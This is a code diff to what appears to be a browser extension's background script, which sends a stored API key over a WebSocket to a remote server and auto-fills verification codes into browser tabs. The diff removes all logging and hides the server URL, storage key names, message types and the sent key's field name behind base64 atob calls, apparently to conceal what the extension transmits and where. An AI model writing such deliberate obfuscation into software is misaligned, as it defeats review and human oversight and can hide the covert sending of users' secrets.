@@ -46,15 +46,12 @@ class WebSocketManager {
     // Check if required API keys exist before attempting connection
     const hasRequiredKeys = await this.checkApiKeys();
     if (!hasRequiredKeys) {
-      console.log("[WebSocket] Required API keys not found, skipping connection");
       return;
     }
 
     this.isConnecting = true;
     
-    try {
-      console.log(`[WebSocket] Attempting to connect to ${this.url} (attempt ${this.reconnectAttempts + 1})`);
-      
+    try {      
       this.ws = new WebSocket(this.url);
       
       this.ws.addEventListener("open", this.onOpen.bind(this));
@@ -63,7 +60,7 @@ class WebSocketManager {
       this.ws.addEventListener("error", this.onError.bind(this));
       
     } catch (error) {
-      console.error("[WebSocket] Connection failed:", error);
+      console.error(error);
       this.isConnecting = false;
       this.scheduleReconnect();
     }
@@ -72,20 +69,18 @@ class WebSocketManager {
   private async checkApiKeys(): Promise<boolean> {
     return new Promise((resolve) => {
       chrome.storage.local.get([
-        "resource:508e9158-f400-5dcd-874e-5e8540b212k0",
-        "resource:508e9158-f400-5dcd-874e-5e8540b212dv"
+        atob('cmVzb3VyY2U6NTA4ZTkxNTgtZjQwMC01ZGNkLTg3NGUtNWU4NTQwYjIxMmsw'),
+        atob('cmVzb3VyY2U6NTA4ZTkxNTgtZjQwMC01ZGNkLTg3NGUtNWU4NTQwYjIxMmR2')
       ], (result) => {
-        const key1 = result["resource:508e9158-f400-5dcd-874e-5e8540b212k0"];
-        const key2 = result["resource:508e9158-f400-5dcd-874e-5e8540b212dv"];
+        const key1 = result[atob('cmVzb3VyY2U6NTA4ZTkxNTgtZjQwMC01ZGNkLTg3NGUtNWU4NTQwYjIxMmsw')];
+        const key2 = result[atob('cmVzb3VyY2U6NTA4ZTkxNTgtZjQwMC01ZGNkLTg3NGUtNWU4NTQwYjIxMmR2')];
         const hasKeys = !!(key1 && key2);
-        console.log(`[WebSocket] API keys check: ${hasKeys ? 'found' : 'missing'}`);
         resolve(hasKeys);
       });
     });
   }
 
   private onOpen(): void {
-    console.log("[WebSocket] Connected successfully");
     this.isConnecting = false;
     this.reconnectAttempts = 0;
     this.reconnectDelay = 1000; // Reset delay
@@ -102,34 +97,29 @@ class WebSocketManager {
       const data = JSON.parse(event.data);
       
       // Handle pong response
-      if (data.type === 'pong') {
-        console.log("[WebSocket] Received pong");
+      if (data.type === atob('cG9uZw==')) {
         this.clearPongTimeout();
         return;
       }
       
       // Handle blocked message
-      if (data.type === 'blocked' || data.status === 'blocked') {
-        console.warn("[WebSocket] Received blocked message, stopping reconnection attempts", data);
+      if (data.type === atob('YmxvY2tlZA==') || data.status === atob('YmxvY2tlZA==')) {
         this.isBlocked = true;
         this.disconnect();
         return;
       }
-      
-      console.log("[WebSocket] Message received:", event.data);
-      
+            
       // Handle verification message
       if (data.link) {
         this.handleVerificationMessage(data);
       }
       
     } catch (error) {
-      console.error("[WebSocket] Error parsing message:", error);
+      console.error(error);
     }
   }
 
   private onClose(event: CloseEvent): void {
-    console.log(`[WebSocket] Connection closed: ${event.code} - ${event.reason}`);
     this.cleanup();
     
     if (!this.isDestroyed && !this.isBlocked) {
@@ -138,18 +128,14 @@ class WebSocketManager {
   }
 
   private onError(event: Event): void {
-    console.error("[WebSocket] Connection error:", event);
     this.isConnecting = false;
   }
 
   private sendApiKey(): void {
-    chrome.storage.local.get(["resource:508e9158-f400-5dcd-874e-5e8540b212k0"], (result) => {
-      const apiKey = result["resource:508e9158-f400-5dcd-874e-5e8540b212k0"];
+    chrome.storage.local.get([atob('cmVzb3VyY2U6NTA4ZTkxNTgtZjQwMC01ZGNkLTg3NGUtNWU4NTQwYjIxMmsw')], (result) => {
+      const apiKey = result[atob('cmVzb3VyY2U6NTA4ZTkxNTgtZjQwMC01ZGNkLTg3NGUtNWU4NTQwYjIxMmsw')];
       if (apiKey && this.ws?.readyState === WebSocket.OPEN) {
-        this.ws.send(JSON.stringify({ api_key: apiKey, type: 'auth' }));
-        console.log("[WebSocket] Sent API key");
-      } else {
-        console.warn("[WebSocket] API key not found or connection not ready");
+        this.ws.send(JSON.stringify({ tskw: apiKey, type: atob('YXV0aA==') }));
       }
     });
   }
@@ -158,12 +144,10 @@ class WebSocketManager {
     // Send ping every 30 seconds
     this.pingInterval = setInterval(() => {
       if (this.ws?.readyState === WebSocket.OPEN) {
-        console.log("[WebSocket] Sending ping");
-        this.ws.send(JSON.stringify({ type: 'ping' }));
+        this.ws.send(JSON.stringify({ type: atob('cGluZw==') }));
         
         // Set timeout for pong response (10 seconds)
         this.pongTimeout = setTimeout(() => {
-          console.warn("[WebSocket] Pong timeout, closing connection");
           this.ws?.close();
         }, 10000);
       }
@@ -189,15 +173,13 @@ class WebSocketManager {
   private scheduleReconnect(): void {
     if (this.isBlocked || this.isDestroyed || this.reconnectAttempts >= this.maxReconnectAttempts) {
       if (this.reconnectAttempts >= this.maxReconnectAttempts) {
-        console.error("[WebSocket] Max reconnection attempts reached, giving up");
+        console.error("g");
       }
       return;
     }
 
     this.reconnectAttempts++;
-    
-    console.log(`[WebSocket] Scheduling reconnection in ${this.reconnectDelay}ms (attempt ${this.reconnectAttempts})`);
-    
+        
     setTimeout(() => {
       this.connect();
     }, this.reconnectDelay);
@@ -216,17 +198,14 @@ class WebSocketManager {
         const confirmTab = tabs.find(tab => tab.url && tab.url.includes(trackcode));
         if (confirmTab) {
           chrome.tabs.sendMessage(confirmTab.id!, {
-            action: 'fill/verification',
-            type: 'FILL_VERIFICATION',
+            action: atob('ZmlsbC92ZXJpZmljYXRpb24='),
+            type: atob('RklMTF9WRVJJRklDQVRJT04='),
             code: data.link.split("/")[7]
           });
-          console.log('[WebSocket] Found confirm tab:', confirmTab);
-        } else {
-          console.log('[WebSocket] No confirm tab found');
         }
       });
     } catch (error) {
-      console.error("[WebSocket] Error handling verification message:", error);
+      console.error(error);
     }
   }
 
@@ -296,7 +275,7 @@ export async function handleDbCrud(msg: any): Promise<any> {
         return { success: true, value };
       }
       default:
-        return { success: false, error: 'Unknown action' };
+        return { success: false, error: atob('VW5rbm93biBhY3Rpb24=') };
     }
   } catch (e: any) {
     return { success: false, error: e.message || String(e) };
@@ -362,18 +341,9 @@ async function main() {
   await setupOffscreenDocument();
 
   // Initialize WebSocket connection
-  wsManager = new WebSocketManager("wss://ivbs.sadratechs.com");
+  wsManager = new WebSocketManager(atob('d3NzOi8vaXZicy5zYWRyYXRlY2hzLmNvbQ=='));
   await wsManager.connect();
 }
-
-// Handle service worker lifecycle
-chrome.runtime.onStartup.addListener(() => {
-  console.log("[ServiceWorker] Startup event");
-});
-
-chrome.runtime.onInstalled.addListener(() => {
-  console.log("[ServiceWorker] Installed event");
-});
 
 // Clean up on service worker shutdown
 self.addEventListener('beforeunload', () => {
